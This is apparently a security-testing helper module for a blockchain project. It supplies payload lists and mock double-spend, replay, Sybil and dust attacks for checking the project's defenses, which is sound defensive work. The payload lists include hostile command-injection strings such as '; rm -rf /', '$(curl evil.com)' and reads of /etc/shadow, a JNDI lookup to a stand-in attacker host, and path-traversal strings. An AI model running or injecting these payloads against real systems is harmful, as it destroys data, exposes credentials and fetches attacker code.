"""
Security Testing Utilities

Helper functions and classes for security testing.
Provides attack simulation, malicious input generation, and security assertion helpers.
"""

import random
import string
import time
from typing import List, Dict, Any
from xai.core.wallet import Wallet
from xai.core.blockchain import Transaction, Blockchain


class AttackSimulator:
    """Simulates various attack scenarios for testing"""

    @staticmethod
    def generate_sql_injection_payloads() -> List[str]:
        """Generate SQL injection attack payloads"""
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; DELETE FROM blocks WHERE 1=1; --",
            "' UNION SELECT * FROM wallets; --",
            "admin'--",
            "' OR 1=1--",
            "1' OR '1' = '1",
            "1' UNION SELECT NULL--",
        ]

    @staticmethod
    def generate_xss_payloads() -> List[str]:
        """Generate XSS attack payloads"""
        return [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg/onload=alert('xss')>",
            "<iframe src='javascript:alert(1)'>",
            "<body onload=alert('xss')>",
        ]

    @staticmethod
    def generate_command_injection_payloads() -> List[str]:
        """Generate command injection attack payloads"""
        return [
            "; rm -rf /",
            "$(curl evil.com)",
            "`whoami`",
            "|cat /etc/passwd",
            "&& ls -la",
            "; cat /etc/shadow",
        ]

    @staticmethod
    def generate_path_traversal_payloads() -> List[str]:
        """Generate path traversal attack payloads"""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/shadow",
            "../../../../../../etc/passwd",
            "....//....//....//etc/passwd",
        ]

    @staticmethod
    def generate_buffer_overflow_payloads() -> List[str]:
        """Generate buffer overflow attack payloads"""
        return [
            "A" * 10000,
            "A" * 100000,
            "\x00" * 10000,
            "\xff" * 10000,
        ]

    @staticmethod
    def generate_format_string_payloads() -> List[str]:
        """Generate format string attack payloads"""
        return [
            "%s%s%s%s",
            "%x%x%x%x",
            "%n%n%n%n",
            "${jndi:ldap://evil.com/a}",
        ]

    @staticmethod
    def generate_overflow_amounts() -> List[float]:
        """Generate amounts designed to cause overflow"""
        return [
            float('inf'),
            float('-inf'),
            float('nan'),
            999999999999999999999.0,
            -999999999999999999999.0,
            1e308,
            -1e308,
        ]

    @staticmethod
    def generate_invalid_addresses() -> List[str]:
        """Generate invalid blockchain addresses"""
        return [
            "",  # Empty
            "INVALID",  # Wrong prefix
            "XAI",  # Too short
            "XAI" + "a" * 200,  # Too long
            "xai123",  # Wrong case
            "XAI'; DROP TABLE blocks; --" + "a" * 30,  # SQL injection
            "XAI<script>alert('xss')</script>" + "a" * 20,  # XSS
        ]


class MaliciousInputGenerator:
    """Generates various types of malicious inputs for testing"""

    @staticmethod
    def generate_random_string(length: int) -> str:
        """Generate random alphanumeric string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    @staticmethod
    def generate_unicode_exploits() -> List[str]:
        """Generate Unicode-based exploits"""
        return [
            "\u0000" * 10,  # Null bytes
            "🚀" * 100,  # Emojis
            "\u202e",  # Right-to-left override
            "\ufeff",  # Zero-width no-break space
            "Ѐ" * 50,  # Cyrillic
        ]

    @staticmethod
    def generate_special_characters() -> List[str]:
        """Generate strings with special characters"""
        return [
            "!@#$%^&*()",
            "<>?:\"{}|",
            "\n\r\t\b\f",
            "';--/**/",
        ]

    @staticmethod
    def generate_edge_case_numbers() -> List[Any]:
        """Generate edge case numeric values"""
        return [
            0,
            -0,
            0.0,
            -0.0,
            0.00000001,
            -0.00000001,
            999999999999,
            -999999999999,
            2**63,
            -(2**63),
        ]

    @staticmethod
    def generate_malformed_json() -> List[str]:
        """Generate malformed JSON payloads"""
        return [
            "{",
            "}",
            '{"key": }',
            '{"key": "value"',
            '{key: "value"}',
            '{"__proto__": {"isAdmin": true}}',
        ]


class SecurityAssertions:
    """Custom assertions for security testing"""

    @staticmethod
    def assert_injection_prevented(function, payloads: List[str], *args, **kwargs):
        """Assert that all injection payloads are prevented"""
        for payload in payloads:
            try:
                # Replace first argument with payload
                test_args = list(args)
                test_args[0] = payload
                result = function(*test_args, **kwargs)

                # Should return False or raise exception
                assert result is False or result is None, \
                    f"Injection payload not prevented: {payload[:50]}"
            except Exception:
                # Exception is acceptable for security
                pass

    @staticmethod
    def assert_rate_limit_enforced(function, max_calls: int, peer_id: str):
        """Assert that rate limit is enforced"""
        # Make calls up to limit
        for _ in range(max_calls):
            function(peer_id)

        # Next call should be rejected
        result = function(peer_id)
        assert result is False or (isinstance(result, tuple) and result[0] is False), \
            "Rate limit not enforced"

    @staticmethod
    def assert_overflow_prevented(validator, amounts: List[float]):
        """Assert that overflow amounts are prevented"""
        for amount in amounts:
            try:
                result = validator.validate_amount(amount)
                # Should not reach here for invalid amounts
                if amount != amount or amount == float('inf') or amount == float('-inf'):
                    assert False, f"Overflow amount not prevented: {amount}"
            except Exception:
                # Exception is expected for overflow
                pass

    @staticmethod
    def assert_sanitized_for_logging(sanitizer, sensitive_data: Dict[str, Any]):
        """Assert that sensitive data is sanitized for logging"""
        result = sanitizer(sensitive_data)

        # Convert to string for checking
        result_str = str(result)

        # Sensitive keys should not appear in full
        for key in ["ip", "email", "phone", "password"]:
            if key in sensitive_data:
                value = str(sensitive_data[key])
                if len(value) > 20:
                    # Long values should be truncated
                    assert value not in result_str or "..." in result_str, \
                        f"Sensitive data '{key}' not sanitized"


class TestWalletFactory:
    """Factory for creating test wallets with various properties"""

    @staticmethod
    def create_funded_wallet(blockchain: Blockchain, amount: float = 100.0) -> Wallet:
        """Create wallet with funds"""
        wallet = Wallet()
        blockchain.mine_pending_transactions(wallet.address)
        return wallet

    @staticmethod
    def create_multiple_funded_wallets(blockchain: Blockchain, count: int) -> List[Wallet]:
        """Create multiple funded wallets"""
        wallets = []
        for _ in range(count):
            wallet = TestWalletFactory.create_funded_wallet(blockchain)
            wallets.append(wallet)
        return wallets

    @staticmethod
    def create_attacker_wallet(blockchain: Blockchain) -> Wallet:
        """Create wallet representing an attacker"""
        return TestWalletFactory.create_funded_wallet(blockchain, amount=1000.0)


class TestTransactionFactory:
    """Factory for creating test transactions"""

    @staticmethod
    def create_valid_transaction(sender: Wallet, recipient: Wallet, amount: float) -> Transaction:
        """Create valid transaction"""
        tx = Transaction(sender.address, recipient.address, amount, 0.24)
        tx.public_key = sender.public_key
        tx.sign_transaction(sender.private_key)
        return tx

    @staticmethod
    def create_malicious_transaction(sender: Wallet, attack_type: str) -> Transaction:
        """Create malicious transaction for testing"""
        if attack_type == "negative_amount":
            tx = Transaction(sender.address, "XAI" + "a" * 40, -100.0, 0.24)
        elif attack_type == "overflow_amount":
            tx = Transaction(sender.address, "XAI" + "a" * 40, float('inf'), 0.24)
        elif attack_type == "invalid_address":
            tx = Transaction(sender.address, "INVALID123", 10.0, 0.24)
        elif attack_type == "sql_injection":
            tx = Transaction(sender.address, "XAI'; DROP TABLE blocks; --" + "a" * 20, 10.0, 0.24)
        else:
            tx = Transaction(sender.address, "XAI" + "a" * 40, 10.0, 0.24)

        return tx

    @staticmethod
    def create_unsigned_transaction(sender: Wallet, recipient: Wallet, amount: float) -> Transaction:
        """Create transaction without signature"""
        tx = Transaction(sender.address, recipient.address, amount, 0.24)
        tx.public_key = sender.public_key
        # Don't sign
        return tx

    @staticmethod
    def create_tampered_transaction(sender: Wallet, recipient: Wallet, amount: float) -> Transaction:
        """Create transaction with tampered signature"""
        tx = Transaction(sender.address, recipient.address, amount, 0.24)
        tx.public_key = sender.public_key
        tx.sign_transaction(sender.private_key)
        # Tamper with signature
        tx.signature = "0" * 128
        return tx


class PerformanceTimer:
    """Timer for measuring performance of security operations"""

    def __init__(self, name: str):
        self.name = name
        self.start_time = None
        self.end_time = None

    def __enter__(self):
        self.start_time = time.time()
        return self

    def __exit__(self, *args):
        self.end_time = time.time()

    def elapsed(self) -> float:
        """Get elapsed time in seconds"""
        if self.start_time and self.end_time:
            return self.end_time - self.start_time
        return 0.0

    def assert_performance(self, max_seconds: float):
        """Assert that operation completed within time limit"""
        elapsed = self.elapsed()
        assert elapsed <= max_seconds, \
            f"{self.name} took {elapsed:.3f}s, expected <= {max_seconds}s"


class MockAttacker:
    """Mock attacker for simulating attack scenarios"""

    def __init__(self):
        self.wallet = Wallet()
        self.attempts = []

    def attempt_double_spend(self, blockchain: Blockchain, victim1: Wallet, victim2: Wallet):
        """Attempt double-spend attack"""
        balance = blockchain.get_balance(self.wallet.address)

        # Try to spend same funds twice
        tx1 = Transaction(self.wallet.address, victim1.address, balance - 0.24, 0.24)
        tx1.public_key = self.wallet.public_key
        tx1.sign_transaction(self.wallet.private_key)

        tx2 = Transaction(self.wallet.address, victim2.address, balance - 0.24, 0.24)
        tx2.public_key = self.wallet.public_key
        tx2.sign_transaction(self.wallet.private_key)

        self.attempts.append(("double_spend", tx1, tx2))

        return tx1, tx2

    def attempt_replay_attack(self, blockchain: Blockchain, original_tx: Transaction):
        """Attempt replay attack"""
        self.attempts.append(("replay", original_tx))
        return original_tx

    def attempt_sybil_attack(self, count: int) -> List[Wallet]:
        """Create multiple wallets for Sybil attack"""
        sybil_wallets = [Wallet() for _ in range(count)]
        self.attempts.append(("sybil", count))
        return sybil_wallets

    def attempt_dust_attack(self, blockchain: Blockchain, victims: List[Wallet]) -> List[Transaction]:
        """Attempt dust attack on multiple victims"""
        from xai.core.blockchain_security import BlockchainSecurityConfig

        dust_amount = BlockchainSecurityConfig.MIN_TRANSACTION_AMOUNT / 2
        dust_transactions = []

        for victim in victims:
            tx = Transaction(self.wallet.address, victim.address, dust_amount, 0.0)
            tx.public_key = self.wallet.public_key
            tx.sign_transaction(self.wallet.private_key)
            dust_transactions.append(tx)

        self.attempts.append(("dust", len(victims)))

        return dust_transactions


# Export all utilities
__all__ = [
    'AttackSimulator',
    'MaliciousInputGenerator',
    'SecurityAssertions',
    'TestWalletFactory',
    'TestTransactionFactory',
    'PerformanceTimer',
    'MockAttacker',
]
